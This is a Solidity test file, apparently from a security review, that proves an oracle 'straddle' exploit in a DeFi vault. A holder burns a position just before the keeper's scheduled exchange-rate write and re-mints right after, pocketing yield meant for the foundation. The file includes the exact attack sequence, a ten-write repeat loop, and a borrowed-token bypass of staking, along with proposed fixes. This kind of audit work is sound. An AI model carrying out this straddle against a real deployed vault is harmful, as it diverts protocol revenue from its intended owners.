// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import {SecurityBase} from "./SecurityBase.t.sol";

/**
 * @title OracleStraddleTest
 * @notice A holder who straddles a keeper write keeps the yield meant for the foundation.
 *
 * @dev **Root cause.** `mint` and `_settle` both convert between 0G value and a0G at the
 *      *spot* oracle rate and remember nothing about the rate a position entered at:
 *
 *          mint:     a0GIn  = mulDiv(delta0G,    WAD, oracle.getValue(), Ceil)
 *          _settle:  a0GOut = mulDiv(unlocked0G, WAD, oracle.getValue(), Floor)
 *
 *      The curve is a pure function of `(supply, amount)`, so a full burn and an immediate
 *      re-mint of the same slice cost the same 0G, and the round trip costs at most 1 wei
 *      (accepted risk R2). The rate, meanwhile, is a staircase: the keeper writes it every 8h.
 *
 *      **Sequence.** A holder whose position is the top slice of the curve:
 *
 *          t0  mint d at er0                   pays     ceil(L / er0) a0G
 *          t2  burn d just before the write    receives floor(L / er0) a0G
 *          t3  keeper writes er1 = er0 * (1 + APR / 1095)
 *          t4  re-mint d at the same supply    pays     ceil(L / er1) a0G  -- fewer
 *
 *      and ends with the identical position plus `floor(L/er0) - ceil(L/er1)` a0G in their
 *      wallet: to the wei, the surplus `harvest` would have swept to the foundation from that
 *      position had it stayed open. Solvency is untouched -- the vault only ever owed L at the
 *      current rate -- so this is a revenue leak, not a theft of principal. Repeated at every
 *      write it captures the whole yield stream: ~15%/yr on the holder's own collateral, i.e.
 *      the entire `P * APR * 0.9` line of the proposal's P&L for that position.
 *
 *      **Why the keeper bot does not change this.** `mellow-interop-bot` guards against large
 *      moves (>1%) and against decreases; a step of APR/1095 ~ +0.0137% is neither, so every
 *      heartbeat passes both guards (`_keeperWrite` asserts exactly that). The bot makes the
 *      staircase *more* usable, not less: the interval is a constant in `docker-compose.yml`
 *      (returned to anyone by the unauthenticated `GetAppInfo` RPC), the write is unconditional
 *      even when the value has not changed, and the transaction is visible in the mempool
 *      before it lands. A holder needs neither the mempool nor luck -- the timetable is public.
 *
 *      **Who can do it.** Only the latest minter(s): a holder lower on the curve re-mints at the
 *      marginal price, which exceeds their own average, and loses in 0G. But the top slice is
 *      always somebody's, and a large late minter is precisely who the curve is built to attract.
 *      Staked iAI is no obstacle: `_settle` burns from the caller's wallet balance, so borrowed
 *      tokens settle the staker's own position (last test).
 *
 *      **Fix.** A minimum holding period on `burn` (R2 already reserves it), or paying
 *      `min(value-based, pro-rata a0G deposited)`. Nothing in the keeper can close it.
 */
contract OracleStraddleTest is SecurityBase {
    /// @dev Foundation pre-mint stand-in: the supply below alice's slice. Who holds it is
    ///      irrelevant; only that alice is the latest minter, so her burn and re-mint traverse
    ///      the same buckets (80..83 of the production table).
    uint256 internal constant PRE_MINT = 2_000e18;
    uint256 internal constant D = 100e18;

    uint256 internal er0;
    uint256 internal er1;

    function setUp() public override {
        super.setUp();
        er0 = vault.exchangeRate();
        er1 = _afterOneStep(er0);
        _mintFor(bob, PRE_MINT);
    }

    /**
     * @notice Control: holding through the write leaves exactly the appreciation for `harvest`.
     * @dev Pins the intended behaviour so the attack test below has something to be compared
     *      against without a state snapshot: the sweep after the write equals `held - owed(er1)`
     *      measured on the state alice leaves behind by simply doing nothing.
     */
    function test_Control_HoldingThroughTheWriteLeavesTheYieldToTheFoundation() public {
        uint256 paid = _mintFor(alice, D);
        uint256 L = _locked(alice);

        uint256 heldBefore = a0g.balanceOf(address(vault));
        uint256 expectedSweep = heldBefore - _owed(er1);

        _keeperWrite(er1);
        uint256 swept = vault.harvest();

        assertEq(swept, expectedSweep, "sweep is held - ceil(totalLocked0G / er1)");
        assertGt(swept, 0, "the write created a surplus");
        // Alice's share of that surplus is what the straddle captures.
        assertGe(swept, paid - _a0GIn(L, er1), "alice's appreciation is inside the sweep");
        assertEq(a0g.balanceOf(alice), 0, "alice, holding, receives nothing");
        _assertSolvent();
    }

    /**
     * @notice The straddle, compared exactly against the control computed on the same state.
     * @dev `expectedControlSweep` is what `harvest` would return after the write if alice did
     *      nothing (see the control test). The attack's sweep is lower by precisely alice's gain.
     */
    function test_StraddlingAKeeperWriteCapturesTheFoundationYield() public {
        _mintFor(alice, D);
        (uint256 lockedBefore, uint256 outstandingBefore,) = vault.positionOf(alice);
        uint256 supplyBefore = iai.totalSupply();

        // What the foundation would have swept had alice held through the write.
        uint256 expectedControlSweep = a0g.balanceOf(address(vault)) - _owed(er1);

        // t2: burn the whole position at er0, just before the write.
        _burn(alice, D);
        uint256 receivedAtEr0 = a0g.balanceOf(alice);
        assertEq(receivedAtEr0, _a0GOut(lockedBefore, er0), "burn pays floor(L / er0)");
        assertEq(iai.totalSupply(), supplyBefore - D, "supply steps back to the slice's base");

        // t3: the keeper's heartbeat lands. The bot's guards let it through.
        _keeperWrite(er1);

        // t4: re-mint the same d at the same supply. Same L of 0G, fewer a0G at er1. The
        // slippage bound is what the burn returned, so the re-mint provably fits inside it.
        vm.startPrank(alice);
        a0g.approve(address(vault), receivedAtEr0);
        vault.mint(D, receivedAtEr0, block.timestamp);
        vm.stopPrank();

        // Position and supply are indistinguishable from having held through the write...
        (uint256 lockedAfter, uint256 outstandingAfter,) = vault.positionOf(alice);
        assertEq(lockedAfter, lockedBefore, "same locked0G as holding through");
        assertEq(outstandingAfter, outstandingBefore, "same iAI outstanding as holding through");
        assertEq(iai.totalSupply(), supplyBefore, "same supply as holding through");

        // ...except her wallet now holds floor(L/er0) - ceil(L/er1) a0G. Exactly.
        uint256 gain = a0g.balanceOf(alice);
        assertEq(gain, _a0GOut(lockedBefore, er0) - _a0GIn(lockedBefore, er1), "gain = floor(L/er0) - ceil(L/er1)");
        assertGt(gain, 0, "the straddle pays");

        // The foundation's sweep is lower by exactly that amount. Same a0G, different pocket.
        uint256 straddleSweep = vault.harvest();
        assertEq(expectedControlSweep - straddleSweep, gain, "the foundation lost precisely what alice gained");

        // A revenue leak, not a theft of principal: held still covers owed.
        _assertSolvent();
    }

    /**
     * @notice Repeated at every write, the straddle takes the whole yield stream.
     * @dev Ten consecutive heartbeats, each straddled and each passing the bot's guards. The
     *      per-write gains are summed exactly alongside the loop; the total is alice's balance.
     *      Over a year (1,095 writes) this converges on the staking APR itself.
     */
    function test_RepeatingTheStraddleCapturesTheWholeYieldStream() public {
        _mintFor(alice, D);
        (uint256 L, uint256 outstanding,) = vault.positionOf(alice);

        vm.prank(alice);
        a0g.approve(address(vault), type(uint256).max);

        uint256 er = er0;
        uint256 expectedGain;
        for (uint256 i = 0; i < 10; i++) {
            uint256 erNext = _afterOneStep(er);
            _burn(alice, D);
            _keeperWrite(erNext);
            vm.prank(alice);
            vault.mint(D, type(uint256).max, block.timestamp);
            expectedGain += _a0GOut(L, er) - _a0GIn(L, erNext);
            er = erNext;
        }

        (uint256 lockedAfter, uint256 outstandingAfter,) = vault.positionOf(alice);
        assertEq(lockedAfter, L, "position intact after ten straddles");
        assertEq(outstandingAfter, outstanding, "position intact after ten straddles");

        uint256 gain = a0g.balanceOf(alice);
        assertEq(gain, expectedGain, "gains sum exactly across writes");
        assertGt(gain, 0, "and they are real");

        // Scale check against the model: ten writes are ~10/1095 of a year at 15% APR.
        uint256 paid = _a0GIn(L, er0);
        assertApproxEqRel(gain, paid * DEFAULT_APR * 10 / WRITES_PER_YEAR / WAD, 0.01e18, "~15% APR pro rata");
        _assertSolvent();
    }

    /**
     * @notice The enabler: a mint-and-burn round trip at one rate costs at most 1 wei (R2).
     * @dev A material cost here -- a fee, or a holding period -- would have to be cleared 1,095
     *      times a year and the straddle would die. It costs a wei, so it does not.
     */
    function test_TheEnabler_ARoundTripCostsAtMostOneWei() public {
        uint256 paid = _mintFor(alice, D);
        _burn(alice, D);
        uint256 returned = a0g.balanceOf(alice);
        assertLe(paid - returned, 1, "R2: round trips are effectively free");
    }

    /**
     * @notice The keeper bot's guards do not stand in the way: a normal heartbeat step is far
     *         inside both, and the bot writes even when nothing changed.
     */
    function test_TheKeeperBotPassesEveryHeartbeatTheStraddleNeeds() public view {
        assertFalse(_botWouldRefuse(er0, er1), "a +APR/1095 step passes the deviation and decrease guards");
        assertFalse(_botWouldRefuse(er0, er0), "an unchanged value passes too (unconditional heartbeat)");
        // The step is ~0.0137%; the deviation guard fires at 1%.
        assertLt((er1 - er0) * 10_000, er0 * BOT_MAX_DEVIATION_BPS / 50, "the step is >50x inside the guard");
    }

    /**
     * @notice Staked iAI is not a defence: `_settle` burns from the caller's wallet, so a staker
     *         can borrow d iAI and settle their own position while their stake never moves.
     * @dev The registry's cooldown gates unstaking, not burning. "Make them stake" closes
     *      nothing; only a holding period on `burn` itself (or a payout capped at the a0G
     *      deposited) would.
     */
    function test_StakedIAIIsNotADefence_BorrowedTokensSettleTheStakersPosition() public {
        _mintFor(alice, D);
        _stakeAll(alice);
        assertEq(iai.balanceOf(alice), 0, "all of alice's own iAI is staked");

        // Alice borrows d iAI. Carol is the lender; any market would do.
        _mintFor(carol, D);
        vm.prank(carol);
        iai.transfer(alice, D);

        uint256 L = _locked(alice);
        _burn(alice, D);

        (uint256 locked, uint256 outstanding,) = vault.positionOf(alice);
        assertEq(locked, 0, "position settled with borrowed iAI");
        assertEq(outstanding, 0, "position settled with borrowed iAI");
        assertEq(registry.stakedOf(alice), D, "her stake never moved");
        assertEq(a0g.balanceOf(alice), _a0GOut(L, er0), "and the collateral came out while staked");
    }
}
